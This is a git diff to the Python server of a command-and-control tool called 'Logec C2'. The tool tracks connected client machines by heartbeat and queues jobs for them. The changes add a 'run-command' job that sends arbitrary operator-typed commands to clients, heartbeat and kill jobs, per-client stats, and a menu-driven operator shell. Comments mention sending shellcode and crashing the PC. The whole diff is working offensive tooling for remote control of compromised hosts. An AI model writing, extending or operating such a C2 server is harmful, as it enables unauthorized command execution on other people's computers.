@@ -5,9 +5,12 @@ import time
 import os
 import random
 import atexit
+from datetime import datetime
 
 HEADER = 64
 FORMAT = 'utf-8'
+
+global_debug = False
 
 class s_sock:
     ##########
@@ -46,7 +49,7 @@ class s_sock:
             
             response_list = []
             for i in self.response:
-                print(f"split response {i}")
+                print(f"split response {i}") if global_debug else None
                 ## stripping out weird carriage returns from windows clients
                 ## SMiley face getting in the way, I think that's why nothing is being sent
                 response_list.append(i.strip("\x01").strip("\x02").rstrip("☻"))
@@ -56,10 +59,10 @@ class s_sock:
                 self.message = response_list[1]
             except:
                 self.message = "none"
-                print("list index out of range with self.message, setting to none")
+                print("list index out of range with self.message, setting to none") if global_debug else None
             
-            print(f"\nID: {self.id}")
-            print(f"MSG: {self.message}")
+            print(f"\nID: {self.id}") if global_debug else None
+            print(f"MSG: {self.message}") if global_debug else None
             
             #message = "ok"
             #self.conn.send(message.encode())
@@ -71,10 +74,10 @@ class s_sock:
                 self.current_clients.append(client_name)
                 
                 ## creating object intance
-                client = s_perclient()
+                self.client = s_perclient()
 
                 # something dict
-                self.clients[client_name] = client
+                self.clients[client_name] = self.client
                 
                 ''' THis is what the dict looks like, each "name" is pointing at a class object
                 clients = {
@@ -84,23 +87,25 @@ class s_sock:
                 }
                 '''
 
-                globals()[client_name] = client
+                globals()[client_name] = self.client
             
             else:
-                print("client exists")
+                ##errmsg here
                 pass
-                ## strip client ID, and pass response along to the client class.
-            
-            ## starting thread for individual client, and listening for message coming back...
-            ## which wont work as hot damn the server is also listening for conenctions
-            
+
             ## TLDR, this is passing the ID, and Message recieved to the correct class & then that class handles it 
-            thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
+            thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
 
             thread.start()  
     
     ## This is temporarily imitating logec code, will get reworked eventually
     def client_interact(self):
+        if os.name == "nt":
+            os.system("cls")
+
+        else:
+            os.system("clear")
+
         ## This will be returned to the client later
         print(" ===== Logec C2 Manual Shell +++++\n\n")
         
@@ -108,23 +113,68 @@ class s_sock:
         for var_name in globals():
             if var_name.startswith("client_"):
                 print(var_name)
-        print("===============================\n\n")
-        
+        print("===============================")
+        print("!! Clients populate on heartbeat, be patient\n\n")
         
         ## dict 
-        client_name = input("Enter a client name to interact, or 'refresh': ")
+        client_name = input("Enter a client name to interact, 'help', or 'refresh': ")
 
         # get the corresponding instance from the clients dictionary and call its method
         if client_name in self.clients:
             client_instance = self.clients[client_name]
             
             while True:
-                client_instance.interact(input(f"Client (jobs for options): [{self.ip_address}]: "))
+                user_input_for_client = input(f"Client (jobs for options): [{self.ip_address}]: ")
+
+                if user_input_for_client == "home":
+                    self.client_interact()
+
+                else:
+                    client_instance.interact(user_input_for_client)
         
         elif client_name.lower() == "refresh":
-            os.system("clear")
+            '''if os.name == "nt":
+                os.system("cls")
+
+            else:
+                os.system("clear")'''
+
             self.client_interact()
-            
+
+        elif client_name.lower() == "stats":
+            stats_list = []
+
+            for client_name, client_instance in self.clients.items():
+                ## Maybe turn into JSON for transport back to safe client
+                stats_string = (
+                    f"Client: {client_name}",
+                    f"Heartbeats: {client_instance.stats_heartbeats}",
+                    f"Heartbeat Interval: {client_instance.stats_heartbeats}",
+                    f"Non wait Jobs run: {client_instance.stats_jobsrun}",
+                    f"Last Checkin: {client_instance.stats_latestcheckin}"
+                )
+
+                #print(stats_string)
+                stats_list.append(f"{stats_string}\n")
+                # access the variable from the client instance
+                variable_value = client_instance.stats_heartbeats
+                
+                # do something with the variable value, e.g. print it
+                #print(f"{client_name}: {variable_value}")
+
+            print(stats_list)
+            input("Type home for home: ")
+            self.client_interact()
+        elif client_name.lower() == "help":
+            print(
+            "Home: \n" \
+            "refresh - refreshes the current connected clients \n" \
+            "stats - ' [BETA] Prints all clients stats'\n" \
+            )
+            ## change these to enter
+            input("Type Home for Home: ")
+            self.client_interact()
+
         else:
             print(f"{client_name} not found.")
             os.system("clear")
@@ -140,6 +190,12 @@ class s_perclient:
         self.first_time = 0
         # setting current job to none to start
         self.current_job = None
+
+        ## stats
+        self.stats_heartbeats = 0
+        self.stats_heartbeat_timer = 15
+        self.stats_jobsrun = 0
+        self.stats_latestcheckin = 0
     
     def handle_client(self, conn, addr, message, id):
         
@@ -151,7 +207,7 @@ class s_perclient:
         
         ## Sending message back to client that connection is ok
         #self.send_msg("ok")
-        print(f"message: {message}")
+        print(f"message: {message}") if global_debug else None
     
         while message:
             #print(f"First Time {self.first_time}")
@@ -161,7 +217,7 @@ class s_perclient:
             #print(received_msg)            
             
             ## Receiveing message from server portion & running through filters
-            print("Call Decision Tree")
+            print("Call Decision Tree") if global_debug else None
             self.decision_tree(message)
             
             ## setting message to none so this waits for a message b4 looping
@@ -170,7 +226,7 @@ class s_perclient:
             if not message:
                 # Client has closed the connection, exit the loop
 
-                print("Conn Closed\n\n")
+                print("Conn Closed\n\n") if global_debug else None
                 break
             
             message = None
@@ -182,46 +238,63 @@ class s_perclient:
         conn.close()
     
     def decision_tree(self, received_msg):
-        print(f"decision tree called, message recieved: {received_msg}")
+        print(f"decision tree called, message recieved: {received_msg}") if global_debug else None
         
-        print(f"MSG: {received_msg}, ID: {self.id}")
+        print(f"MSG: {received_msg}, ID: {self.id}") if global_debug else None
         
+        ## received_msg should always be ID. If not, either the client is fucked up
+        ## or someone is trying to get access to the server 
+        ## If a legit message (command output etc) is being sent back, received_msg[0] and 1 should be true and not equal eachother
         if received_msg[0] == self.id:
-            print(f"Recieved heartbeat from {self.ip}")
+            print(f"Recieved heartbeat from {self.ip}") if global_debug else None
+            ## +1 to heartbeat
+            self.stats_heartbeats = self.stats_heartbeats + 1
+            self.stats_latestcheckin = datetime.utcnow()
+
             ## check current_job, & send job ONLY on heartbeat
-            
+
             if self.current_job != None:
-                print(f"Sending Current Job: {self.current_job}")
+                print(f"Sending Current Job: {self.current_job}") if global_debug else None
                 ## sending job
                 self.send_msg(self.current_job)
+
+                ## nested if...
+                if self.current_job != "wait":
+                    ## stats
+                    self.stats_jobsrun = self.stats_jobsrun + 1
+
                 ## resetting values
                 self.cleanup()
-                print(f"Current Job on server side: {self.current_job}")
-            
+                print(f"Current Job on server side: {self.current_job}") if global_debug else None
+
             else:
                 ## sending wait anyways just to cover my ass incase something goes wrong on the client side
                 self.current_job = "wait\\|/wait"
                 self.send_msg(self.current_job)
-                print("No Current Job available, client will sleep\n\n")
+                print("No Current Job available, client will sleep\n\n") if global_debug else None
+        ## cover my ass
+        else:
+            print(f"!! WARNING: There was an attempt to connect to server without an ID!\nMessage sent was: {received_msg}")
     
     ## This part is what the user interacts with, and it sets self.current_job based on the decision. 
     
     ## Self.job executes/gets sent out when the client recieves a heartbeat
     def interact(self, user_input_raw):
+        ## Action categpries: set (sets a paramter), run (runs something), info (gets info)
         user_input = user_input_raw.lower()
         
         if user_input == "jobs":
-            print("Jobs: \nShell [IP, Port] ")
+            print(
+            "Jobs: \n" \
+            "home - takes you to the initial client (aka home) screen\n" \
+            "run-command - 'Runs a command (does not return output... yet)'\n" \
+            "set-heartbeat - Sets the heartbeat of the client\n" \
+            "kill - Kills the client (does not delete... yet)\n" \
+            )
 
-        elif user_input == "home":
-            os.system("clear")
-            ## jumping out of the current class, back to the main one
-            ## might cause thread issues
-            SERV.client_interact()
-            
-        elif user_input == "run_command":
+        elif user_input == "run-command":
             command = input("Enter command: ")
-            self.current_job = f"run_command\\|/{command}"
+            self.current_job = f"run-command\\|/{command}"
             #self.current_job = "wait"
             
         ## Idea for shell, have all the code on this side. That way, you just pass the string/command in, and 
@@ -230,14 +303,21 @@ class s_perclient:
         
         ## How it may work: Shell job gets sent, then the client listens for a followup string, which is the shellcode being sent
         elif user_input == "shell":
-            self.current_job = "shell"
+            self.current_job = "shell\\|/shell"
         
         elif user_input == "wait":
             self.current_job = "wait\\|/wait"
             
-        elif user_input == "adjust_heartbeat":
-            self.current_job = "adjust_heartbeat"
-        
+        elif user_input == "set-heartbeat":
+            new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")
+            self.current_job = f"set-heartbeat\\|/{int(new_heartbeat)}"
+
+        elif user_input == "kill":
+            ## add additional actions like shutdown, or crash PC in the command slot
+            #new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")
+
+            self.current_job = f"kill\\|/kill"        
+
         elif user_input == "current_job":
             print(self.current_job.strip("\\|/"))
             
@@ -245,13 +325,14 @@ class s_perclient:
             print("No input provided!")
         
         else:
+            print("Job does not exist - type 'jobs' for jobs")
             self.current_job == "none"
             
     def cleanup(self):
         self.current_job = "wait\\|/wait"
         
     def send_msg(self, message):
-        print(f"Message being sent: {message}")
+        print(f"Message being sent: {message}") if global_debug else None
         ## 
         self.conn.send(message.encode())
         
